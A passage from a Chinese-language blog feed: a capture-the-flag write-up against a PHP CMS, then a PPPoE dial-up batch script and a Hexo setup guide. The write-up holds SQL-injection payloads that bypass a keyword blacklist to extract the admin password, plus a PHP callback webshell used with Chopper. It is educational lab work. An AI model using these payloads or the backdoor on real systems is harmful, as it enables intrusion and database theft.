href="https://findneo.github.io/">https://findneo.github.io/</a></p><p>php://filter/convert.base64-encode/resource=filename</p></blockquote><p>常用过滤器列表：</p><ul><li>String Filters<ul><li>string.rot13</li><li>string.toupper</li><li>string.tolower</li><li>string.strip_tags</li></ul></li><li>Conversion Filters<ul><li>convert.base64-encode &amp; convert.base64-decode</li><li>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</li></ul></li><li>Compression Filters</li><li>Encryption Filters</li></ul><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>全局搜索 <em>mysql_query</em> ，发现 <em>say.php,so.php,index.php</em> 都存在数据库操作。选择 <em>so.php</em> 下手。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*so.php*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]!=<span class="string">"Xlcteam Browser"</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~'</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_POST[<span class="string">'soid'</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'antiinject.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'antixss.php'</span>;</span><br><span class="line">$id=antiinject($id);</span><br><span class="line">$con = mysql_connect($db_address,$db_user,$db_pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"不能连接到数据库！！"</span>.mysql_error());</span><br><span class="line">mysql_select_db($db_name,$con);</span><br><span class="line">$id=mysql_real_escape_string($id);</span><br><span class="line">$result=mysql_query(<span class="string">"SELECT * FROM `message` WHERE display=1 AND id=$id"</span>);</span><br><span class="line">$rs=mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">echo</span> htmlspecialchars($rs[<span class="string">'nice'</span>]).<span class="string">':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'</span>.antixss($rs[<span class="string">'say'</span>]).<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">mysql_free_result($result);</span><br><span class="line">mysql_free_result($file);</span><br><span class="line">mysql_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line"><span class="comment">/*antiinject.php*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">antiinject</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">$keyword=<span class="keyword">array</span>(<span class="string">"select"</span>,<span class="string">"union"</span>,<span class="string">"and"</span>,<span class="string">"from"</span>,<span class="string">' '</span>,<span class="string">"'"</span>,<span class="string">";"</span>,<span class="string">'"'</span>,<span class="string">"char"</span>,<span class="string">"or"</span>,<span class="string">"count"</span>,<span class="string">"master"</span>,<span class="string">"name"</span>,<span class="string">"pass"</span>,<span class="string">"admin"</span>,<span class="string">"+"</span>,<span class="string">"-"</span>,<span class="string">"order"</span>,<span class="string">"="</span>);</span><br><span class="line">$info=strtolower($content);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=count($keyword);$i++)&#123;</span><br><span class="line"> $info=str_replace($keyword[$i], <span class="string">''</span>,$info);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $info;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> 关注 3、11、14、15行。</p><ol><li><p>burp抓包，修改 <em>User-Agent</em> 字段即可。</p></li><li><p><em>antiinject()</em> 过滤规则是按黑名单<strong><em>依次</em></strong>把关键字删除。</p><ol><li>用黑名单里最后一个关键字 <code>=</code> 分隔即可绕过对多字符关键字的过滤。</li><li>用 <code>/**/</code> 代替空格符。</li><li>单字符关键字不太会弄，也许可以用各种编码绕过，不过我们暂时未必需要，有空格和这些多字符关键字，再加上不在黑名单里的 <code>&lt;&gt;/()</code> 已经可以开始搞事了。</li></ol></li><li><p><em>mysql_real_escape_string()</em> 的功能是对<code>\x00, \n, \r, \, &#39;, &quot; , \x1a(撤销键,ctrl+z)</code> 加反斜杠转义，我们不用这些字符就是了。</p></li><li><p>15行处将处理过的参数直接拼接到查询语句，因为查询结果有多列，又没有逗号可用，不好用内联注入，于是尝试基于逻辑的注入。数据库结构在 <em>sm.txt</em> 已经给出。</p></li><li><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">我们想要在数据库执行的查询语句是这样：</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`message`</span> <span class="keyword">WHERE</span> display=<span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">mid</span>((<span class="keyword">select</span> userpass <span class="keyword">from</span> <span class="keyword">admin</span>)<span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>))&gt;<span class="number">65</span></span><br><span class="line"></span><br><span class="line">因为没法用空格，所以实际上是这样：</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`message`</span> <span class="keyword">WHERE</span> display=<span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">id</span>=   <span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="keyword">ascii</span>(<span class="keyword">mid</span>((<span class="keyword">select</span><span class="comment">/**/</span>userpass<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">admin</span>)<span class="keyword">from</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">for</span><span class="comment">/**/</span><span class="number">1</span>))&gt;<span class="number">65</span></span><br><span class="line"></span><br><span class="line">希望经过过滤的 <span class="keyword">id</span> 值为：</span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="keyword">ascii</span>(<span class="keyword">mid</span>((<span class="keyword">select</span><span class="comment">/**/</span>userpass<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">admin</span>)<span class="keyword">from</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">for</span><span class="comment">/**/</span><span class="number">1</span>))&gt;<span class="number">65</span></span><br><span class="line"></span><br><span class="line">向 so.php post过去的参数应该是：</span><br><span class="line">soid=<span class="number">1</span><span class="comment">/**/</span>an=d<span class="comment">/**/</span><span class="keyword">ascii</span>(<span class="keyword">mid</span>((selec=t<span class="comment">/**/</span>userpas=s<span class="comment">/**/</span>fro=m<span class="comment">/**/</span>admi=n)fro=m<span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span>fo=r<span class="comment">/**/</span><span class="number">1</span>))&gt;<span class="number">65</span></span><br><span class="line"></span><br><span class="line">使用burp爆破</span><br><span class="line">soid=<span class="number">1</span><span class="comment">/**/</span>an=d<span class="comment">/**/</span><span class="keyword">ascii</span>(<span class="keyword">mid</span>((selec=t<span class="comment">/**/</span>userpas=s<span class="comment">/**/</span>fro=m<span class="comment">/**/</span>admi=n)fro=m<span class="comment">/**/</span>§<span class="number">1</span>§<span class="comment">/**/</span>fo=r<span class="comment">/**/</span><span class="number">1</span>))&gt;§<span class="number">65</span>§</span><br><span class="line">使用 Cluster Bomb 模式，第一个payload 为 [<span class="number">1</span><span class="number">-40</span>] ，第二个为 [<span class="number">31</span>,<span class="number">32</span>,<span class="number">47</span><span class="number">-57</span>](经过几次尝试发现usepass字段只有[ \d] )</span><br><span class="line">得到[<span class="number">49</span>,<span class="number">48</span>,<span class="number">50</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">49</span>,<span class="number">55</span>,<span class="number">32</span>,<span class="number">57</span>,<span class="number">57</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">48</span>,<span class="number">55</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">49</span>,<span class="number">52</span>,<span class="number">32</span>,<span class="number">48</span>,<span class="number">49</span>,<span class="number">55</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">49</span>,<span class="number">48</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">49</span>,<span class="number">54</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">49</span>,<span class="number">55</span>]</span><br><span class="line">也就是[<span class="number">102</span> ,<span class="number">117</span> ,<span class="number">99</span> ,<span class="number">107</span> ,<span class="number">114</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">117</span>]即funckruntu，访问loginxlcteam登陆即可</span><br><span class="line"></span><br><span class="line">进后台得知有管理员留的后门 xlcteam.php ，于是读一下这个文件</span><br></pre></td></tr></table></figure></li></ol><h2 id="意外"><a href="#意外" class="headerlink" title="意外"></a>意外</h2><p>看别人的writeup时惊喜的发现原来并没有过滤逗号，这意味着可以一次注出来管理员密码！所以深夜里我是有些激动的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">soid=1/**/an=d/**/0/**/unio=n/**/selec=t/**/null,usernam=e,userpas=s,null/**/fro=m/**/admi=n</span><br><span class="line"></span><br><span class="line">//当然，在充分掌握数据库结构前需要一些尝试。</span><br></pre></td></tr></table></figure><h2 id="使用回调后门"><a href="#使用回调后门" class="headerlink" title="使用回调后门"></a>使用回调后门</h2><p>回调后门似乎是 phithon 师傅最先这样称呼的，在 <a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html" target="_blank" rel="noopener"><em>创造tips的秘籍——PHP回调后门</em> </a>里做了具体介绍。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//xlcteam.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'www'</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'wtf'</span>] =&gt; <span class="string">'|.*|e'</span>,);</span><br><span class="line">array_walk($arr, $e, <span class="string">''</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  <span class="comment">//使用菜刀连接即可。</span></span><br><span class="line">  <span class="comment">//url : http://cms.nuptzj.cn/xlcteam.php?www=preg_replace</span></span><br><span class="line">  <span class="comment">//密码:wtf</span></span><br></pre></td></tr></table></figure><p>菜刀连上后拿到所有文件，发现 config.php 里有数据库配置，于是就可以操作整个数据库了。</p><p>是的，中午吃的是美味的黄焖鸡 \o/</p><p><img src="cmsnupt.png" alt=""></p><p><img src="arlogined.png" alt=""></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>命令行拨号上网</title>
      <link href="/171003CmdSurfnet/"/>
      <url>/171003CmdSurfnet/</url>
      
        <content type="html"><![CDATA[<p>校园网使用PPPoE拨号上网，每次都通过图形化界面通断网络不太方便，希望能一键上网一键下线，于是写了个小脚本。</p><p>配置好相关参数后保存为  <code>C:\Windows\System32\surf.bat</code> ，重启命令行即可使用 <code>surf</code> 命令通断网络，常用的话甚至只要 <code>win+r-&gt;enter</code>就可以自由迅速地上线下线啦。把下面第二十行的注释去掉可以在联网同时打开ss，有些缺憾的是还没有实现断网时退出ss。</p><p>流程控制参考了<a href="http://www.infionline.net/~wtnewton/batch/batguide.html#8" target="_blank" rel="noopener">Batch Guide by Terry Newton</a> 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">REM 校园网使用PPPoE拨号上网，将文件内容存为 C:\Windows\System32\surf.bat ，可以命令行拨号上网</span><br><span class="line">REM 可自行加开ss</span><br><span class="line">@echo off</span><br><span class="line"><span class="built_in">set</span> name=net   REM 修改net 为拨号连接的名字</span><br><span class="line"><span class="built_in">set</span> phone=<span class="number">13323333333</span>   REM 修改为拨号上网手机号</span><br><span class="line"><span class="built_in">set</span> pass=<span class="number">2333</span>    REM    运营商提供的密码</span><br><span class="line"></span><br><span class="line">rasdial | findstr 已连接 &gt; nul</span><br><span class="line"><span class="keyword">if</span> errorlevel <span class="number">1</span> <span class="keyword">goto</span> notfound</span><br><span class="line"></span><br><span class="line">rem <span class="built_in">string</span> was found</span><br><span class="line">rasdial %name% /disconnect </span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span> endfind</span><br><span class="line"></span><br><span class="line">:notfound</span><br><span class="line">rem <span class="built_in">string</span> was <span class="keyword">not</span> found</span><br><span class="line">rasdial %name% %phone% %pass%</span><br><span class="line"><span class="keyword">if</span> <span class="string">"%1"</span> neq <span class="string">""</span> <span class="keyword">goto</span> :endfind</span><br><span class="line">REM start C:\path\to\your\Shadowsocks\Shadowsocks.exe</span><br><span class="line">:endfind</span><br></pre></td></tr></table></figure><h2 id="2017-10-05-更新代码"><a href="#2017-10-05-更新代码" class="headerlink" title="2017/10/05 更新代码"></a>2017/10/05 更新代码</h2><p>添加第十九行，如果ss已经在运行，只要传入一个参数就不会尝试开启啦。</p><hr><h2 id="2018-03-12重写"><a href="#2018-03-12重写" class="headerlink" title="2018-03-12重写"></a>2018-03-12重写</h2><p>逻辑更清晰，添加重连功能，有时被ban可以起到刷新IP的作用。</p><ul><li><strong>surf  r</strong>  断开并重新连接</li><li><strong>surf</strong>  通&lt;=&gt;断</li><li><strong>surf any</strong>  连接但不启动shadow socks</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line"><span class="built_in">set</span> name=net   REM 修改net 为拨号连接的名字</span><br><span class="line"><span class="built_in">set</span> phone=<span class="number">13323333333</span>   REM 修改为拨号上网手机号</span><br><span class="line"><span class="built_in">set</span> pass=<span class="number">2333</span>    REM    运营商提供的密码</span><br><span class="line">rasdial | findstr 已连接 &gt; nul</span><br><span class="line"><span class="built_in">set</span> is_connect=%errorlevel%</span><br><span class="line"></span><br><span class="line">echo %is_connect%</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> %is_connect%==<span class="number">1</span> <span class="keyword">goto</span> not_connected</span><br><span class="line"><span class="keyword">if</span> %is_connect%==<span class="number">0</span> <span class="keyword">goto</span> connected</span><br><span class="line"></span><br><span class="line">:connected</span><br><span class="line"><span class="keyword">if</span> <span class="string">"%1"</span>==<span class="string">"r"</span> <span class="keyword">goto</span> re_connect</span><br><span class="line"><span class="keyword">goto</span> disconnect</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">:not_connected</span><br><span class="line"><span class="keyword">if</span> <span class="string">"%1"</span>==<span class="string">"s"</span> <span class="keyword">goto</span> connect_with_ss</span><br><span class="line"><span class="keyword">goto</span> connect_without_ss</span><br><span class="line"></span><br><span class="line">rem ==========================================</span><br><span class="line"></span><br><span class="line">:re_connect</span><br><span class="line">rasdial %name% /disconnect</span><br><span class="line">ping <span class="number">127.1</span> -n <span class="number">2</span> &gt; nul</span><br><span class="line">rasdial %name% %phone% %pass%</span><br><span class="line">ipconfig | find <span class="string">"IPv4"</span></span><br><span class="line"><span class="keyword">goto</span> end</span><br><span class="line"></span><br><span class="line">:disconnect</span><br><span class="line">rasdial %name% /disconnect</span><br><span class="line"><span class="keyword">goto</span> end</span><br><span class="line"></span><br><span class="line">:connect_without_ss</span><br><span class="line">rasdial %name% %phone% %pass%</span><br><span class="line">ipconfig | find <span class="string">"IPv4"</span></span><br><span class="line"><span class="keyword">goto</span> end</span><br><span class="line"></span><br><span class="line">:connect_with_ss</span><br><span class="line">rasdial %name% %phone% %pass%</span><br><span class="line">start D:\path\to\Shadowsocks<span class="number">-4.0</span><span class="number">.6</span>\Shadowsocks.exe</span><br><span class="line">ipconfig | find <span class="string">"IPv4"</span></span><br><span class="line"><span class="keyword">goto</span> end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">:end</span><br></pre></td></tr></table></figure><h2 id="2018-4-12-22-44-update"><a href="#2018-4-12-22-44-update" class="headerlink" title="2018/4/12 22:44 update"></a>2018/4/12 22:44 update</h2><p>由于断开与重新拨号间需要有个时延，所以以上代码使用第26行实现，这也是大部分batch脚本实现时延的方法。</p><p><code>ping 127.1 n_seconds &gt; nul</code> 可以实现整秒延时，而TK教主在 <a href="http://tombkeeper.blog.techweb.com.cn/archives/14" target="_blank" rel="noopener">完美的批处理Sleep</a> 中提到一种在批处理脚本中理论上能精确到0.01秒的延时操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">@ECHO OFF</span><br><span class="line">SETLOCAL EnableExtensions </span><br><span class="line">CALL :ProcDelay <span class="number">50</span></span><br><span class="line">GOTO :EOF</span><br><span class="line"></span><br><span class="line">REM 可以理解为函数名和参数 </span><br><span class="line">:ProcDelay delayMSec_ </span><br><span class="line">REM SETLOCAL和 ENDLOCAL 之间是拥有独立的环境变量空间 </span><br><span class="line">SETLOCAL EnableExtensions </span><br><span class="line">REM EnableExtensions  在本空间内使能命令扩展  </span><br><span class="line">REM 参考 https:<span class="comment">//docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc772046(v%3dws.11) </span></span><br><span class="line">REM %TIME% 形如 <span class="number">23</span>:<span class="number">12</span>:<span class="number">22.42</span> 包括时分秒和毫秒 </span><br><span class="line">FOR /f <span class="string">"tokens=1-4 delims=:. "</span> %%<span class="function">h <span class="title">IN</span> <span class="params">(<span class="string">"%TIME%"</span>)</span> DO SET start_</span>=%%h%%i%%j%%k </span><br><span class="line">REM 循环</span><br><span class="line">:_procwaitloop</span><br><span class="line">FOR /f <span class="string">"tokens=1-4 delims=:. "</span> %%<span class="function">h <span class="title">IN</span> <span class="params">(<span class="string">"%TIME%"</span>)</span> DO SET now_</span>=%%h%%i%%j%%k</span><br><span class="line">SET /a diff_=%now_%-%start_%</span><br><span class="line">REM <span class="number">1</span>% 即 delayMSec_ 即 <span class="number">50</span></span><br><span class="line">IF %diff_% LSS %<span class="number">1</span> GOTO _procwaitloop </span><br><span class="line"></span><br><span class="line">ECHO <span class="string">"%start_% =&gt; %now_%"</span> </span><br><span class="line">ENDLOCAL &amp; GOTO :EOF</span><br><span class="line"></span><br><span class="line">:EOF</span><br></pre></td></tr></table></figure><p>原文如下：</p><p><img src="1523547891745.png" alt="1523547891745"></p><p><img src="1523547861674.png" alt="1523547861674"></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>博客搭建与自定义</title>
      <link href="/170926HexoConfig/"/>
      <url>/170926HexoConfig/</url>
      
        <content type="html"><![CDATA[<p>利用GitHub page和hexo搭建一个个人博客主要分三步：</p><ol><li>使用hexo在本地搭建一个可访问的博客。</li><li>自定义博客样式。</li><li>将博客发布到GitHub page。</li></ol><h3 id="hexo本地搭建可访问博客"><a href="#hexo本地搭建可访问博客" class="headerlink" title="hexo本地搭建可访问博客"></a>hexo本地搭建可访问博客</h3><p><a href="https://hexo.io/zh-cn/docs/index.html" target="_blank" rel="noopener">官方文档</a>讲的很详细了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">基于Windows 10 ; hexo: 3.3.9 ; next Release 5.0.0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">1.安装 Node.js (https://nodejs.org/en/download/)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">2.安装 Git <span class="keyword">for</span> Windows (https://github.com/waylau/git-for-win)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">3.安装 hexo</span></span><br><span class="line"><span class="meta">#</span><span class="bash">  打开cmd.exe</span></span><br><span class="line">npm install -g hexo-cli</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">4. 创建博客</span></span><br><span class="line"><span class="meta">#</span><span class="bash">  进入想要放博客文件的目录</span></span><br><span class="line">hexo init &lt;folder&gt;</span><br><span class="line">cd &lt;folder&gt;</span><br><span class="line">npm install</span><br><span class="line"><span class="meta">#</span><span class="bash"> 到此为止已经可以看到效果</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> hexo clean;hexo g;hexo s [--debug]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">5. 自选主题，如next (http://theme-next.iissnan.com/getting-started.html)</span></span><br><span class="line">cd themes</span><br><span class="line">git clone https://github.com/iissnan/hexo-theme-next themes/next</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 到此为止目录结构如下</span></span><br><span class="line">.</span><br><span class="line">├── _config.yml  [站点配置文件]</span><br><span class="line">├── ...</span><br><span class="line">├── source</span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes</span><br><span class="line">├──landscape</span><br><span class="line">└──next</span><br><span class="line">└──_config.yml [博客配置文件]</span><br></pre></td></tr></table></figure><h3 id="自定义博客样式"><a href="#自定义博客样式" class="headerlink" title="自定义博客样式"></a>自定义博客样式</h3><h4 id="blog-config-yml"><a href="#blog-config-yml" class="headerlink" title="blog/_config.yml"></a>blog/_config.yml</h4><p><a href="https://github.com/findneo/findneo.github.io/blob/0f6cc6c0c88e46ed8409e7c4c76e86eea0fadea9/_config.yml" target="_blank" rel="noopener">git commit</a></p><h4 id="blog-themes-next-config-yml"><a href="#blog-themes-next-config-yml" class="headerlink" title="blog/themes/next/_config.yml"></a>blog/themes/next/_config.yml</h4><p><a href="https://github.com/findneo/findneo.github.io/commit/c690492c2000d7544f17bf68928d98b576d164a9#diff-40e8f09dcfb3466627fdbc030ae0795c" target="_blank" rel="noopener">git commit</a> </p><h4 id="版权声明-，参考"><a href="#版权声明-，参考" class="headerlink" title="版权声明 ，参考"></a>版权声明 ，<a href="http://www.crocutax.com/2017/05/20/Hexo%E6%8C%81%E7%BB%AD%E4%BC%98%E5%8C%96-%E5%9C%A8%E6%96%87%E7%AB%A0%E5%B0%BE%E9%83%A8%E6%B7%BB%E5%8A%A0%E7%89%88%E6%9D%83%E5%A3%B0%E6%98%8E%E4%BF%A1%E6%81%AF/" target="_blank" rel="noopener">参考</a></h4><h5 id="blog-themes-next-layout-macro-post-copyright-swig"><a href="#blog-themes-next-layout-macro-post-copyright-swig" class="headerlink" title="blog\themes\next\layout_macro\post-copyright.swig"></a>blog\themes\next\layout_macro\post-copyright.swig</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"post-copyright"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"post-copyright-title"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">strong</span>&gt;</span>&#123;&#123; __('post.copyright.title') + __('symbol.colon') &#125;&#125;<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123; post.permalink &#125;&#125;"</span> &gt;</span>&#123;&#123; post.title &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"post-copyright-author"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">strong</span>&gt;</span>&#123;&#123; __('post.copyright.author') + __('symbol.colon') &#125;&#125;<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123;config.url&#125;&#125;"</span> <span class="attr">title</span>=<span class="string">"&#123;&#123;__('post.copyright.welcome')&#125;&#125;"</span>&gt;</span> &#123;&#123; config.author &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"post-copyright-link"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">strong</span>&gt;</span>&#123;&#123; __('post.copyright.link') + __('symbol.colon') &#125;&#125;<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123; post.permalink &#125;&#125;"</span> <span class="attr">title</span>=<span class="string">"&#123;&#123; post.title &#125;&#125;"</span>&gt;</span>&#123;&#123; post.permalink &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"post-copyright-license"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">strong</span>&gt;</span>&#123;&#123; __('post.copyright.license_title') + 